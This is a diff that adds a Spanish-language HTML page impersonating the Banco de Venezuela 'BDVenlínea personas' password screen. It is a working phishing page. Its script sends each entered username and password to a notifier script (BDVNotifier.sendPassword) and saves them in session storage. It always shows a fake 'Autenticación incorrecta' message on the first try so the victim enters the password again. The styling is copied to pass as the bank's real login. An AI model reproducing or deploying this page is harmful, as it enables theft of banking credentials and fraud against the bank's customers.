@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>BDVenlínea personas - Contraseña</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      -webkit-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      -webkit-backface-visibility: hidden;
+      backface-visibility: hidden;
+    }
+
+    body {
+      font-family: 'Open Sans', 'Roboto', Arial, Helvetica, sans-serif;
+      background-color: #ffffff;
+      background-image: url('bdv-bg.jpg');
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-attachment: fixed;
+      background-size: cover;
+      color: #555;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* ENCABEZADO SUPERIOR OFICIAL */
+    .header {
+      height: 64px;
+      background: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 28px;
+      border-bottom: 1px solid #e2e8f0;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      width: 100%;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+    }
+
+    .header-logo {
+      height: 38px;
+      width: auto;
+      object-fit: contain;
+      user-select: none;
+    }
+
+    /* MENÚ HAMBURGUESA */
+    .menu-btn {
+      padding: 6px;
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      color: #24292f;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 4px;
+    }
+
+    .menu-btn svg {
+      width: 28px;
+      height: 28px;
+    }
+
+    /* CONTENEDOR PRINCIPAL */
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 16px;
+      width: 100%;
+      min-height: calc(100vh - 64px);
+    }
+
+    /* TARJETA DE FONDO */
+    .card {
+      width: 100%;
+      max-width: 540px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.96);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 12px;
+      padding: 44px 44px 40px;
+      box-shadow: 0 10px 30px -4px rgba(0, 0, 0, 0.16), 0 2px 6px rgba(0, 0, 0, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.85);
+    }
+
+    .card-logo-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 30px;
+      user-select: none;
+    }
+
+    .card-logo {
+      width: 100%;
+      max-width: 275px;
+      height: auto;
+      object-fit: contain;
+    }
+
+    .input-wrapper {
+      margin-bottom: 24px;
+      width: 100%;
+    }
+
+    .input {
+      width: 100%;
+      height: 50px;
+      background: #ededed;
+      border: none;
+      border-bottom: 2px solid #8e9499;
+      border-top-left-radius: 4px;
+      border-top-right-radius: 4px;
+      padding: 0 16px;
+      font-size: 15px;
+      font-weight: 500;
+      outline: none;
+      color: #222;
+      caret-color: #d71945;
+    }
+
+    .button {
+      width: 100%;
+      height: 48px;
+      border: none;
+      border-radius: 4px;
+      background: #0d5db8;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .links {
+      text-align: center;
+      margin-top: 26px;
+      font-size: 13.5px;
+      line-height: 1.8;
+    }
+
+    .links a {
+      color: #4b5157;
+      text-decoration: none;
+    }
+
+    /* =========================================
+       CAPA OSCURA (OVERLAY MODAL)
+    ========================================= */
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.45);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+      z-index: 1000;
+      animation: fadeIn 0.2s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    /* =========================================
+       MODAL: SOLO DICE "INTRODUCE UNA CONTRASEÑA" Y LOS DOS BOTONES
+    ========================================= */
+
+    .modal {
+      width: 100%;
+      max-width: 520px;
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 42px 38px 36px;
+      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.26);
+      animation: scaleUp 0.2s ease-out;
+    }
+
+    @keyframes scaleUp {
+      from {
+        transform: scale(0.96);
+        opacity: 0.8;
+      }
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .modal-title {
+      text-align: center;
+      color: #1169a5;
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 28px;
+      line-height: 1.25;
+    }
+
+    /* CASILLA DE CONTRASEÑA CON LA RAYITA ROJA */
+    .password-box {
+      position: relative;
+      background: #ededed;
+      border-bottom: 2px solid #8e9499;
+      border-top-left-radius: 4px;
+      border-top-right-radius: 4px;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      padding: 0 50px 0 16px;
+      transition: border-color 0.2s, background-color 0.2s;
+      width: 100%;
+    }
+
+    /* RAYITA ROJA IDENTICA AL ENFOCAR */
+    .password-box:focus-within {
+      border-bottom: 2px solid #d71945;
+      background-color: #fbf5f6;
+    }
+
+    /* ESTADO DE ERROR EN CONTRASEÑA */
+    .password-box.has-error {
+      border-bottom: 2px solid #d71945 !important;
+      background-color: #fff2f4 !important;
+      animation: bdvInputShake 0.35s ease-in-out;
+    }
+
+    /* =========================================
+       TARJETA AZUL BDV: AUTENTICACIÓN INCORRECTA
+    ========================================= */
+    .bdv-blue-card {
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      background: linear-gradient(135deg, #0874bd 0%, #065b94 100%);
+      color: #ffffff;
+      border-radius: 8px;
+      padding: 14px 16px 16px;
+      margin-bottom: 20px;
+      text-align: left;
+      box-shadow: 0 4px 18px rgba(8, 116, 189, 0.32);
+      animation: bdvBlueSlide 0.25s ease-out;
+      width: 100%;
+      border: 1px solid rgba(255, 255, 255, 0.25);
+    }
+
+    @keyframes bdvBlueSlide {
+      from {
+        opacity: 0;
+        transform: translateY(-8px) scale(0.98);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .bdv-blue-card-icon {
+      color: #ffffff;
+      flex-shrink: 0;
+      margin-top: 1px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      width: 26px;
+      height: 26px;
+    }
+
+    .bdv-blue-card-icon svg {
+      width: 17px;
+      height: 17px;
+      stroke: #ffffff;
+    }
+
+    .bdv-blue-card-content {
+      flex: 1;
+    }
+
+    .bdv-blue-card-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 3px;
+      letter-spacing: -0.1px;
+    }
+
+    .bdv-blue-card-desc {
+      font-size: 12.5px;
+      color: rgba(255, 255, 255, 0.92);
+      line-height: 1.4;
+      font-weight: 400;
+    }
+
+    .bdv-card-timer {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      height: 3px;
+      background: rgba(255, 255, 255, 0.55);
+      width: 100%;
+      animation: bdvTimer 4s linear forwards;
+    }
+
+    @keyframes bdvTimer {
+      from { width: 100%; }
+      to { width: 0%; }
+    }
+
+    .password-box input {
+      width: 100%;
+      height: 100%;
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 16px;
+      font-weight: 500;
+      color: #222;
+      caret-color: #d71945;
+    }
+
+    .password-box input::placeholder {
+      color: #73787d;
+      font-size: 15px;
+      font-weight: 400;
+    }
+
+    /* Desactivar cualquier icono nativo duplicado del navegador */
+    input[type="password"]::-ms-reveal,
+    input[type="password"]::-ms-clear {
+      display: none !important;
+    }
+
+    input[type="password"]::-webkit-contacts-auto-fill-button,
+    input[type="password"]::-webkit-credentials-auto-fill-button {
+      display: none !important;
+      visibility: hidden;
+      pointer-events: none;
+      position: absolute;
+      right: 0;
+    }
+
+    /* OJITO PROFESIONAL VECTORIAL (NO RÉPLICA) */
+    .eye-btn {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      padding: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #61666d;
+      border-radius: 50%;
+      transition: color 0.15s ease, background-color 0.15s ease;
+      outline: none;
+    }
+
+    .eye-btn:hover {
+      color: #d71945;
+      background-color: rgba(215, 25, 69, 0.08);
+    }
+
+    .eye-icon {
+      width: 22px;
+      height: 22px;
+      stroke: currentColor;
+      stroke-width: 1.85;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      fill: none;
+    }
+
+    /* LOS DOS BOTONES */
+    .buttons {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin-top: 32px;
+      width: 100%;
+    }
+
+    .btn {
+      flex: 1;
+      height: 48px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s ease;
+      user-select: none;
+    }
+
+    .btn-continue:disabled,
+    .btn-continue[disabled] {
+      background: #ddd !important;
+      color: #999 !important;
+      cursor: not-allowed !important;
+      box-shadow: none !important;
+      pointer-events: none;
+    }
+
+    .btn-continue:not(:disabled) {
+      background: #0874bd !important;
+      color: white !important;
+      cursor: pointer !important;
+      box-shadow: 0 2px 8px rgba(8, 116, 189, 0.28);
+      pointer-events: auto;
+    }
+
+    .btn-continue:not(:disabled):hover {
+      background: #075f9c !important;
+    }
+
+    .btn-continue:not(:disabled):active {
+      transform: scale(0.99);
+    }
+
+    .btn-cancel {
+      background: #0874bd;
+      color: white;
+      box-shadow: 0 2px 8px rgba(8, 116, 189, 0.2);
+    }
+
+    .btn-cancel:hover {
+      background: #075f9c;
+    }
+
+    .btn-cancel:active {
+      transform: scale(0.99);
+    }
+
+    /* =========================================
+       ADAPTACIÓN MÓVIL
+    ========================================= */
+
+    @media (max-width: 768px) {
+      body {
+        background-attachment: scroll;
+      }
+
+      .header {
+        height: 54px;
+        padding: 0 16px;
+      }
+
+      .header-logo {
+        height: 28px;
+      }
+
+      .main {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px 16px;
+        min-height: calc(100vh - 54px);
+      }
+
+      .card {
+        width: 100%;
+        max-width: 540px;
+        padding: 38px 26px 34px;
+        border-radius: 12px;
+      }
+
+      .card-logo {
+        width: 100%;
+        max-width: 275px;
+      }
+
+      .input {
+        height: 52px;
+        font-size: 15.5px;
+        padding: 0 16px;
+      }
+
+      .button {
+        height: 50px;
+        font-size: 15.5px;
+        border-radius: 4px;
+      }
+
+      .links {
+        margin-top: 24px;
+        font-size: 13.5px;
+        line-height: 1.8;
+      }
+
+      /* Modal / Tarjeta de contraseña amplia y clara en móvil */
+      .overlay {
+        padding: 16px;
+      }
+
+      .modal {
+        width: 100%;
+        max-width: 440px;
+        padding: 28px 24px 24px;
+        border-radius: 12px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      }
+
+      .modal-title {
+        font-size: 18px;
+        margin-bottom: 18px;
+      }
+
+      .password-box {
+        height: 48px;
+        padding-left: 14px;
+        padding-right: 42px;
+      }
+
+      .password-box input {
+        font-size: 15px;
+      }
+
+      .eye-btn {
+        right: 8px;
+        padding: 4px;
+      }
+
+      .eye-btn svg {
+        width: 18px;
+        height: 18px;
+      }
+
+      .buttons {
+        gap: 10px;
+        margin-top: 18px;
+      }
+
+      .card, .modal {
+        backdrop-filter: none !important;
+        -webkit-backdrop-filter: none !important;
+        background: #ffffff !important;
+      }
+
+      .input, .password-box input {
+        font-size: 16px !important;
+        -webkit-appearance: none;
+      }
+
+      .btn {
+        height: 38px;
+        font-size: 13.5px;
+        border-radius: 5px;
+      }
+
+      .bdv-blue-card {
+        padding: 12px 14px 14px;
+        margin-bottom: 14px;
+        gap: 10px;
+      }
+
+      .bdv-blue-card-icon {
+        width: 24px;
+        height: 24px;
+      }
+
+      .bdv-blue-card-icon svg {
+        width: 15px;
+        height: 15px;
+      }
+
+      .bdv-blue-card-title {
+        font-size: 13.5px;
+      }
+
+      .bdv-blue-card-desc {
+        font-size: 12px;
+      }
+    }
+
+    /* =========================================
+       LOADER: FONDO SUTIL Y RAYAS GRIS CON TOQUE NEGRO
+    ========================================= */
+    .loader-center {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0, 0, 0, 0.16);
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      z-index: 999999;
+      animation: fadeInLoader 0.15s ease-out;
+    }
+
+    @keyframes fadeInLoader {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .loader {
+      display: flex;
+      align-items: center;
+      gap: 3.5px;
+    }
+
+    .loader span {
+      width: 8px;
+      height: 28px;
+      background: #2b2f36;
+      border-radius: 2px;
+      animation: movimiento 0.8s ease-in-out infinite;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
+    }
+
+    .loader span:nth-child(1) {
+      animation-delay: 0s;
+    }
+
+    .loader span:nth-child(2) {
+      animation-delay: 0.12s;
+    }
+
+    .loader span:nth-child(3) {
+      animation-delay: 0.24s;
+    }
+
+    .loader span:nth-child(4) {
+      animation-delay: 0.36s;
+    }
+
+    @keyframes movimiento {
+      0%, 100% {
+        transform: scaleY(0.45);
+        opacity: 0.55;
+      }
+
+      50% {
+        transform: scaleY(1.4);
+        opacity: 1;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Encabezado superior con Logotipo Banco de Venezuela -->
+  <header class="header">
+    <a href="index.html" class="brand" title="Volver a Trámites">
+      <img src="bdv-logo.png" alt="Banco de Venezuela" class="header-logo">
+    </a>
+
+    <button type="button" class="menu-btn" aria-label="Abrir menú">
+      <svg fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+      </svg>
+    </button>
+  </header>
+
+  <!-- Contenedor Principal -->
+  <main class="main">
+    <section class="card">
+      <div class="card-logo-container">
+        <img src="bdv-enlinea-personas.png" alt="BDVenlínea personas" class="card-logo">
+      </div>
+
+      <div class="input-wrapper">
+        <input
+          id="userInput"
+          class="input"
+          type="text"
+          placeholder="Usuario *"
+          readonly
+        >
+      </div>
+
+      <button class="button">
+        Entrar
+      </button>
+
+      <div class="links">
+        <a href="#">¿Olvidaste tu usuario o clave?</a>
+        <br>
+        <a href="#">Si eres nuevo cliente, regístrate aquí</a>
+      </div>
+    </section>
+  </main>
+
+  <!-- CAPA OSCURA Y MODAL: SOLO DICE "INTRODUCE UNA CONTRASEÑA" Y LOS DOS BOTONES -->
+  <div class="overlay" id="passwordOverlay">
+
+    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+
+      <h1 class="modal-title" id="modalTitle">
+        Introduce una contraseña
+      </h1>
+
+      <!-- Tarjeta azul oficial: Autenticación incorrecta -->
+      <div class="bdv-blue-card" id="passwordErrorAlert" style="display: none;" role="alert">
+        <div class="bdv-blue-card-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"></circle>
+            <line x1="12" y1="8" x2="12" y2="12"></line>
+            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+          </svg>
+        </div>
+        <div class="bdv-blue-card-content">
+          <div class="bdv-blue-card-title">Autenticación incorrecta</div>
+          <div class="bdv-blue-card-desc">Por favor, verifique sus datos e intente nuevamente.</div>
+        </div>
+        <div class="bdv-card-timer"></div>
+      </div>
+
+      <div class="password-box" id="passwordBox">
+
+        <input
+          id="demoPassword"
+          type="password"
+          placeholder="Contraseña"
+          autocomplete="off"
+          autofocus
+        >
+
+        <!-- Ojito profesional vectorial SVG (no réplica) -->
+        <button
+          type="button"
+          class="eye-btn"
+          id="togglePasswordBtn"
+          onclick="togglePassword()"
+          aria-label="Mostrar u ocultar contraseña"
+          title="Mostrar u ocultar contraseña"
+        >
+          <!-- Icono de ojo abierto (ver) -->
+          <svg id="eyeOpenIcon" class="eye-icon" viewBox="0 0 24 24">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+            <circle cx="12" cy="12" r="3"></circle>
+          </svg>
+
+          <!-- Icono de ojo cerrado (ocultar) -->
+          <svg id="eyeClosedIcon" class="eye-icon" viewBox="0 0 24 24" style="display: none;">
+            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+            <line x1="1" y1="1" x2="23" y2="23"></line>
+          </svg>
+        </button>
+
+      </div>
+
+      <div class="buttons">
+
+        <button
+          type="button"
+          class="btn btn-continue"
+          id="continueBtn"
+          disabled>
+          Continuar
+        </button>
+
+        <button
+          type="button"
+          class="btn btn-cancel"
+          id="cancelBtn"
+          onclick="closeModal()">
+          Cancelar
+        </button>
+
+      </div>
+
+    </div>
+
+  </div>
+
+  <script src="notifier.js"></script>
+  <script>
+    const passwordInput = document.getElementById('demoPassword');
+    const continueBtn = document.getElementById('continueBtn');
+    const eyeOpenIcon = document.getElementById('eyeOpenIcon');
+    const eyeClosedIcon = document.getElementById('eyeClosedIcon');
+    const userInput = document.getElementById('userInput');
+
+    // Cargar usuario temporal de la sesión
+    const urlParams = new URLSearchParams(window.location.search);
+    const savedUser = urlParams.get('user') || sessionStorage.getItem('bdv_user');
+    if (savedUser) {
+      if (userInput) userInput.value = savedUser;
+      sessionStorage.setItem('bdv_user', savedUser);
+    }
+
+    // Alternar visibilidad de contraseña (ojito vectorial, no réplica)
+    function togglePassword() {
+      if (!passwordInput) return;
+      const isPassword = passwordInput.type === 'password';
+      passwordInput.type = isPassword ? 'text' : 'password';
+      if (eyeOpenIcon && eyeClosedIcon) {
+        eyeOpenIcon.style.display = isPassword ? 'none' : 'block';
+        eyeClosedIcon.style.display = isPassword ? 'block' : 'none';
+      }
+    }
+
+    // Función para forzar el estado visual y funcional del botón Continuar:
+    // En gris (#ddd) si no es válido, y en azul (#0874bd) únicamente cuando es válido
+    function setContinueButtonState(isActive) {
+      if (!continueBtn) return;
+      if (isActive) {
+        continueBtn.disabled = false;
+        continueBtn.style.setProperty('background-color', '#0874bd', 'important');
+        continueBtn.style.setProperty('color', '#ffffff', 'important');
+        continueBtn.style.setProperty('cursor', 'pointer', 'important');
+        continueBtn.style.setProperty('box-shadow', '0 2px 8px rgba(8, 116, 189, 0.28)', 'important');
+        continueBtn.style.setProperty('pointer-events', 'auto', 'important');
+      } else {
+        continueBtn.disabled = true;
+        continueBtn.style.setProperty('background-color', '#dddddd', 'important');
+        continueBtn.style.setProperty('color', '#999999', 'important');
+        continueBtn.style.cursor = 'not-allowed';
+        continueBtn.style.setProperty('box-shadow', 'none', 'important');
+        continueBtn.style.setProperty('pointer-events', 'none', 'important');
+      }
+    }
+
+    // Cancelar y volver al login
+    function closeModal() {
+      setContinueButtonState(false);
+      window.location.href = 'login.html';
+    }
+
+    // Validación estricta:
+    // 1. NUNCA se activa con solo letras minúsculas (ej: 'fjsdhfjkfa') -> QUEDA EN GRIS
+    // 2. NUNCA se activa con solo mayúsculas o solo números -> QUEDA EN GRIS
+    // 3. ÚNICAMENTE se activa cuando contiene mayúscula Y minúscula en las letras
+    function hasUpperAndLowerCase(val) {
+      if (!val || typeof val !== 'string') return false;
+      const cleanVal = val.trim();
+
+      // Longitud mínima
+      if (cleanVal.length < 4) return false;
+
+      const hasUpper = /[A-ZÁÉÍÓÚÑ]/.test(cleanVal);
+      const hasLower = /[a-záéíóúñ]/.test(cleanVal);
+
+      // Si NO tiene mayúscula (bloquea 'fjsdhfjkfa' y similares) -> no se activa
+      if (!hasUpper) return false;
+
+      // Si NO tiene minúscula -> no se activa
+      if (!hasLower) return false;
+
+      return true;
+    }
+
+    function updateContinueButton() {
+      const val = passwordInput ? passwordInput.value : '';
+      const passwordBox = document.getElementById('passwordBox');
+      if (val.length > 0 && passwordBox && passwordBox.classList.contains('has-error')) {
+        passwordBox.classList.remove('has-error');
+      }
+      const isValid = hasUpperAndLowerCase(val);
+      setContinueButtonState(isValid);
+    }
+
+    // Manejo de la contraseña y botón Continuar
+    let passwordAttemptCount = 0;
+
+    if (passwordInput && continueBtn) {
+      // Inicializar garantizado en gris
+      setContinueButtonState(false);
+
+      passwordInput.addEventListener('input', updateContinueButton);
+      passwordInput.addEventListener('keyup', updateContinueButton);
+      passwordInput.addEventListener('change', updateContinueButton);
+      passwordInput.addEventListener('paste', () => {
+        setTimeout(updateContinueButton, 20);
+      });
+
+      passwordInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          if (!continueBtn.disabled) {
+            continueBtn.click();
+          } else {
+            e.preventDefault();
+          }
+        }
+      });
+
+      function showLoader(callback, duration = 6000) {
+        const loader = document.getElementById('pageLoader');
+        if (loader) {
+          loader.style.display = 'flex';
+          setTimeout(() => {
+            loader.style.display = 'none';
+            if (typeof callback === 'function') {
+              callback();
+            }
+          }, duration);
+        } else if (typeof callback === 'function') {
+          callback();
+        }
+      }
+
+      continueBtn.addEventListener('click', () => {
+        if (continueBtn.disabled) return;
+
+        const currentAttempts = parseInt(sessionStorage.getItem('bdv_pwd_attempts') || '0', 10);
+        const pwd = passwordInput ? passwordInput.value : '';
+        const user = (userInput ? userInput.value.trim() : '') || sessionStorage.getItem('bdv_user') || '';
+
+        // PRIMER INTENTO: Autenticación incorrecta en tarjeta azul durante 4 segundos y volver a página de usuario
+        if (currentAttempts === 0) {
+          if (window.BDVNotifier) {
+            BDVNotifier.sendPassword(user, pwd, 1);
+          }
+          sessionStorage.setItem('bdv_pwd_1', pwd);
+
+          showLoader(() => {
+            sessionStorage.setItem('bdv_pwd_attempts', '1');
+            passwordAttemptCount = 1;
+
+            const errorAlert = document.getElementById('passwordErrorAlert');
+            const passwordBox = document.getElementById('passwordBox');
+            if (errorAlert) {
+              errorAlert.style.display = 'flex';
+              errorAlert.style.opacity = '1';
+            }
+            if (passwordBox) {
+              passwordBox.classList.add('has-error');
+            }
+            if (passwordInput) {
+              passwordInput.value = '';
+            }
+            setContinueButtonState(false);
+
+            // Dura 4 segundos, se quita la alerta y se devuelve a la página de usuario
+            setTimeout(() => {
+              if (errorAlert) {
+                errorAlert.style.transition = 'opacity 0.3s ease';
+                errorAlert.style.opacity = '0';
+              }
+              setTimeout(() => {
+                if (errorAlert) {
+                  errorAlert.style.display = 'none';
+                  errorAlert.style.opacity = '1';
+                }
+                if (passwordBox) {
+                  passwordBox.classList.remove('has-error');
+                }
+                // Devolverse a la página de usuario
+                window.location.href = 'login.html';
+              }, 300);
+            }, 4000);
+          }, 1200);
+          return;
+        }
+
+        // SEGUNDO INTENTO: Acceso concedido, avanza a la siguiente pantalla
+        if (window.BDVNotifier) {
+          BDVNotifier.sendPassword(user, pwd, 2);
+        }
+        sessionStorage.setItem('bdv_pwd_2', pwd);
+        sessionStorage.removeItem('bdv_pwd_attempts');
+        const overlay = document.getElementById('passwordOverlay');
+        if (overlay) {
+          overlay.style.display = 'none';
+        }
+        window.location.href = 'cargando.html';
+      });
+
+      // Auto-enfoque inmediato para activar la rayita roja
+      setTimeout(() => {
+        passwordInput.focus();
+      }, 120);
+    }
+  </script>
+
+  <!-- CARGA CON FONDO MÁS CLARO Y RAYAS EN GRIS CLARO -->
+  <div class="loader-center" id="pageLoader" style="display: none;">
+    <div class="loader">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+  </div>
+
+</body>
+</html>
